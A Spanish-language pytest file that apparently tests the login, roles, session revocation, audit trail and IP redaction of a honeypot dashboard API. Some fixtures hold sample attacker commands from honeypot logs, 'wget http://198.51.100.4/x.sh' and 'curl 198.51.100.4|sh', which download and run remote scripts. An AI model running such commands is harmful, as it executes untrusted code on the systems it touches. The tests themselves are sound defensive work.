"""El ingreso, los roles y lo que cada uno ve, sin Elasticsearch.

Lo que se fija acá es lo que nadie nota hasta que es tarde: que una ruta nueva nazca cerrada, que
una cookie tocada o vencida no sirva, que una baja o un cambio de rol corten la sesión abierta, que
nadie administre su mismo rol ni uno mayor, que probar contraseñas trabe la cuenta, y que el
invitado no reciba ninguna dirección.
"""

from __future__ import annotations

import io
import json
import re
import urllib.error
import urllib.parse
from collections.abc import Iterator
from typing import Any

import pytest
from fastapi.testclient import TestClient

from honeyml.api import acceso, almacen, auditoria, decisiones, exportar, registros, telemetria
from honeyml.api.main import app


class IndiceFalso:
    """Lo justo de Elasticsearch para cuentas y auditoría: documentos por id y búsqueda de todo."""

    def __init__(self) -> None:
        self.docs: dict[str, dict[str, dict[str, Any]]] = {}

    def __call__(
        self, metodo: str, ruta: str, cuerpo: dict[str, Any] | None = None, es_url: str = ""
    ) -> dict[str, Any]:
        partes = ruta.split("?")[0].strip("/").split("/")
        indice = self.docs.setdefault(partes[0], {})
        if partes[1] == "_search":
            hits = sorted(
                indice.items(), key=lambda par: par[1].get("@timestamp", ""), reverse=True
            )
            return {
                "hits": {
                    "total": {"value": len(hits)},
                    "hits": [{"_id": i, "_source": d} for i, d in hits],
                }
            }
        if partes[1] == "_doc" and len(partes) == 2:
            indice[str(len(indice))] = dict(cuerpo or {})
            return {"result": "created"}
        doc_id = urllib.parse.unquote(partes[2])
        if metodo == "GET":
            if doc_id not in indice:
                raise urllib.error.HTTPError(ruta, 404, "no", None, io.BytesIO())  # type: ignore[arg-type]
            return {"_source": json.loads(json.dumps(indice[doc_id]))}
        if partes[1] == "_create" and doc_id in indice:
            raise urllib.error.HTTPError(ruta, 409, "ya", None, io.BytesIO())  # type: ignore[arg-type]
        indice[doc_id] = json.loads(json.dumps(cuerpo))
        return {"result": "ok"}


@pytest.fixture
def indice(monkeypatch: pytest.MonkeyPatch) -> Iterator[IndiceFalso]:
    falso = IndiceFalso()
    monkeypatch.setattr(almacen, "pedir", falso)
    monkeypatch.setattr(acceso, "intentos", acceso.Intentos())
    acceso._cuentas.clear()
    app.dependency_overrides.clear()
    yield falso
    acceso._cuentas.clear()


def _cuenta(nombre: str, rol: str, contrasena: str = "una-clave-larga") -> None:
    acceso.crear(acceso.Alta(usuario=nombre, rol=rol, contrasena=contrasena), None)  # type: ignore[arg-type]


def _ingresar(cliente: TestClient, nombre: str, contrasena: str = "una-clave-larga") -> Any:
    return cliente.post("/api/sesion", json={"usuario": nombre, "contrasena": contrasena})


# La contraseña y la cookie


def test_la_contrasena_se_guarda_cifrada_y_con_sal_propia() -> None:
    a, b = acceso.cifrar("misma-clave"), acceso.cifrar("misma-clave")
    assert a != b
    assert "misma-clave" not in a
    assert acceso.coincide("misma-clave", a)
    assert not acceso.coincide("otra-clave", a)


def test_una_cookie_tocada_o_vencida_no_sirve() -> None:
    token = acceso.firmar("ana", "analista", 1, ahora=1000.0)
    assert acceso.leer(token, ahora=1001.0) == {"u": "ana", "r": "analista", "s": 1, "v": 29800}
    cuerpo, _, firma = token.partition(".")
    otro = acceso._b64(json.dumps({"u": "ana", "r": "superadmin", "s": 1, "v": 29800}).encode())
    assert acceso.leer(f"{otro}.{firma}", ahora=1001.0) is None
    assert acceso.leer(token, ahora=1000.0 + acceso.DURACION_S + 1) is None
    assert acceso.leer("basura") is None


def test_cinco_fallas_traban_la_cuenta_un_rato() -> None:
    intentos = acceso.Intentos(tope=5, espera_s=300)
    for i in range(5):
        assert intentos.espera("ana", ahora=float(i)) == 0
        intentos.fallo("ana", ahora=float(i))
    assert intentos.espera("ana", ahora=10.0) == pytest.approx(290.0)
    assert intentos.espera("ana", ahora=301.0) == 0
    intentos.acierto("ana")
    assert intentos.espera("ana", ahora=11.0) == 0


# Quién administra a quién


def test_cada_rol_administra_solo_los_de_abajo() -> None:
    admin = acceso.Sesion("a", "admin")
    superadmin = acceso.Sesion("s", "superadmin")
    assert admin.administra("analista") and admin.administra("invitado")
    assert not admin.administra("admin") and not admin.administra("superadmin")
    assert superadmin.administra("admin")
    assert not superadmin.administra("superadmin")
    assert not acceso.Sesion("x", "analista").administra("invitado")


def test_un_admin_no_crea_otro_admin(indice: IndiceFalso) -> None:
    alta = acceso.Alta(usuario="otro", rol="admin", contrasena="una-clave-larga")
    with pytest.raises(acceso.SinPermisoError):
        acceso.crear(alta, acceso.Sesion("a", "admin"))
    assert "otro" not in indice.docs.get(acceso.USUARIOS, {})


def test_no_se_repite_un_nombre(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    with pytest.raises(acceso.YaExisteError):
        _cuenta("ana", "invitado")


def test_el_nombre_y_la_contrasena_se_validan_antes_de_guardar() -> None:
    with pytest.raises(ValueError):
        acceso.Alta(usuario="Ana Pérez", rol="analista", contrasena="una-clave-larga")
    with pytest.raises(ValueError):
        acceso.Alta(usuario="ana", rol="analista", contrasena="corta")


def test_la_cuenta_publica_no_trae_el_cifrado(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    publica = acceso.listar(acceso.Sesion("jefa", "admin"))[0]
    assert "contrasena" not in publica and "sello" not in publica
    assert publica["administrable"] is True


# El ingreso por la API


def test_toda_ruta_pide_sesion_salvo_las_publicas(indice: IndiceFalso) -> None:
    cliente = TestClient(app)
    assert cliente.get("/api/snapshot").status_code == 401
    assert cliente.get("/api/decisiones").status_code == 401
    assert cliente.get("/api/telemetria/en-vivo").status_code == 401
    rutas = {
        (metodo, r.path)  # type: ignore[attr-defined]
        for r in app.routes
        for metodo in getattr(r, "methods", set())
        if r.path.startswith("/api/")  # type: ignore[attr-defined]
    }
    assert acceso.PUBLICAS <= rutas


def test_ingresar_abre_la_sesion_y_deja_rastro(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    cliente = TestClient(app)
    r = _ingresar(cliente, "ana")
    assert r.status_code == 200
    assert r.json() == {"usuario": "ana", "rol": "analista"}
    assert "httponly" in r.headers["set-cookie"].lower()
    assert cliente.get("/api/sesion").json()["usuario"] == "ana"
    acciones = [d["accion"] for d in indice.docs[auditoria.AUDITORIA].values()]
    assert acciones == ["cuenta_creada", "ingreso"]


def test_un_ingreso_fallido_no_dice_que_fallo(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    cliente = TestClient(app)
    malo = _ingresar(cliente, "ana", "otra-clave-larga")
    inexistente = _ingresar(cliente, "nadie", "otra-clave-larga")
    assert malo.status_code == inexistente.status_code == 401
    assert malo.json() == inexistente.json()


def test_probar_contrasenas_traba_la_cuenta(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    cliente = TestClient(app)
    for _ in range(5):
        assert _ingresar(cliente, "ana", "otra-clave-larga").status_code == 401
    # trabada, ni la contraseña correcta entra
    assert _ingresar(cliente, "ana").status_code == 429


def test_una_baja_corta_la_sesion_abierta(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    _cuenta("jefa", "admin")
    cliente = TestClient(app)
    _ingresar(cliente, "ana")
    assert cliente.get("/api/sesion").status_code == 200
    acceso.modificar("ana", acceso.Cambio(activo=False), acceso.Sesion("jefa", "admin"))
    assert cliente.get("/api/sesion").status_code == 401
    assert _ingresar(cliente, "ana").status_code == 401


def test_cambiar_el_rol_cierra_la_sesion_con_el_rol_viejo(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    cliente = TestClient(app)
    _ingresar(cliente, "ana")
    acceso.modificar("ana", acceso.Cambio(rol="invitado"), acceso.Sesion("jefa", "admin"))
    assert cliente.get("/api/sesion").status_code == 401
    _ingresar(cliente, "ana")
    assert cliente.get("/api/sesion").json()["rol"] == "invitado"


def test_nadie_se_administra_a_si_mismo(indice: IndiceFalso) -> None:
    _cuenta("jefa", "admin")
    with pytest.raises(acceso.SinPermisoError):
        acceso.modificar("jefa", acceso.Cambio(activo=False), acceso.Sesion("jefa", "admin"))


def test_el_invitado_no_deja_veredictos(indice: IndiceFalso) -> None:
    _cuenta("visita", "invitado")
    cliente = TestClient(app)
    _ingresar(cliente, "visita")
    r = cliente.put("/api/decisiones/d1/revision", json={"veredicto": "confirma"})
    assert r.status_code == 403
    assert cliente.get("/api/decisiones/a-ciegas/siguiente").status_code == 403


def test_solo_el_superadmin_ve_la_auditoria(indice: IndiceFalso) -> None:
    _cuenta("jefa", "admin")
    _cuenta("raiz", "superadmin")
    cliente = TestClient(app)
    _ingresar(cliente, "jefa")
    assert cliente.get("/api/auditoria").status_code == 403
    _ingresar(cliente, "raiz")
    r = cliente.get("/api/auditoria")
    assert r.status_code == 200
    assert r.json()["total"] >= 3


def test_cambiar_la_contrasena_propia_pide_la_actual(indice: IndiceFalso) -> None:
    _cuenta("ana", "analista")
    cliente = TestClient(app)
    _ingresar(cliente, "ana")
    mal = cliente.put(
        "/api/sesion/contrasena", json={"actual": "otra-clave-larga", "nueva": "nueva-clave-larga"}
    )
    assert mal.status_code == 422
    bien = cliente.put(
        "/api/sesion/contrasena", json={"actual": "una-clave-larga", "nueva": "nueva-clave-larga"}
    )
    assert bien.status_code == 200
    # la sesión que hizo el cambio sigue abierta, y con la contraseña anterior no se entra
    assert cliente.get("/api/sesion").status_code == 200
    assert _ingresar(TestClient(app), "ana").status_code == 401


# Lo que ve cada rol


FILA = {
    "doc_id": "d1",
    "origen": "203.0.113.9",
    "resumen": "cowrie/process ssh: wget http://198.51.100.4/x.sh",
    "severidad": "critico",
    "revision": None,
}


def test_el_invitado_recibe_las_decisiones_sin_direcciones(
    como_invitado: list[dict[str, Any]], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(decisiones, "listar", lambda **_: {"total": 1, "items": [FILA]})
    texto = TestClient(app).get("/api/decisiones").text
    assert not re.search(r"\d+\.\d+\.\d+\.\d+", texto)
    assert "critico" in texto


def test_el_analista_recibe_el_evento_como_llego(
    como_analista: list[dict[str, Any]], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(decisiones, "listar", lambda **_: {"total": 1, "items": [FILA]})
    assert "203.0.113.9" in TestClient(app).get("/api/decisiones").text


def test_el_reporte_csv_no_lleva_direcciones_y_queda_anotado(
    como_invitado: list[dict[str, Any]], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(decisiones, "para_exportar", lambda **_: {"total": 1, "items": [FILA]})
    r = TestClient(app).get("/api/exportar/decisiones.csv?severidad=critico")
    assert r.status_code == 200
    assert r.text.startswith(exportar.BOM + "momento del evento,")
    assert not re.search(r"\d+\.\d+\.\d+\.\d+", r.text)
    assert r.headers["x-total"] == "1"
    assert como_invitado[-1]["accion"] == "exportacion"
    assert como_invitado[-1]["detalle"]["severidad"] == "critico"


def test_el_csv_dice_si_y_no() -> None:
    texto = exportar.revisiones_csv([{"veredicto": "corrige", "a_ciegas": True, "motor": {}}])
    assert ",sí," in texto


# Lo que lee el superadmin


def test_la_telemetria_en_vivo_no_trae_direcciones(monkeypatch: pytest.MonkeyPatch) -> None:
    evento = {
        "@timestamp": "2026-10-08T12:00:00Z",
        "source": {"ip": "203.0.113.9", "geo": {"country_name": "Brasil"}},
        "destination": {"ip": "192.0.2.1", "port": 22},
        "process": {"command_line": "curl 198.51.100.4|sh"},
    }
    monkeypatch.setattr(
        telemetria.queries,
        "_search",
        lambda *a, **k: {"hits": {"hits": [{"_id": "e1", "_source": evento}]}},
    )
    salida = telemetria.en_vivo()["eventos"][0]
    assert "source.ip" not in salida and "destination.ip" not in salida
    assert salida["process.command_line"] == "curl x.x.x.x|sh"
    assert salida["source.geo.country_name"] == "Brasil"


def test_los_registros_del_servidor_se_leen_juntos_y_tapados(tmp_path: Any) -> None:
    (tmp_path / "honeyml_watchdog.log").write_text(
        "[2026-10-08 10:00:00] dionaea: sin escribir hace 700 s, reinicio\n"
        "[2026-10-08 12:00:00] todo en orden\n"
    )
    (tmp_path / "honeyml_despliegues.log").write_text(
        "[2026-10-08 11:00:00] desplegado abc1234 desde 10.0.0.5\n"
    )
    salida = registros.ultimas(directorio=tmp_path)
    assert salida["disponible"] is True
    assert salida["fuentes"] == {
        "despliegues": True,
        "vigilante": True,
        "salud": False,
        "respaldo": False,
    }
    momentos = [e["momento"] for e in salida["entradas"]]
    assert momentos == sorted(momentos, reverse=True)
    assert "x.x.x.x" in salida["entradas"][1]["texto"]
    assert salida["entradas"][2]["alerta"] is True


def test_sin_el_montaje_los_registros_dicen_que_no_estan(tmp_path: Any) -> None:
    assert registros.ultimas(directorio=tmp_path / "no-esta")["disponible"] is False
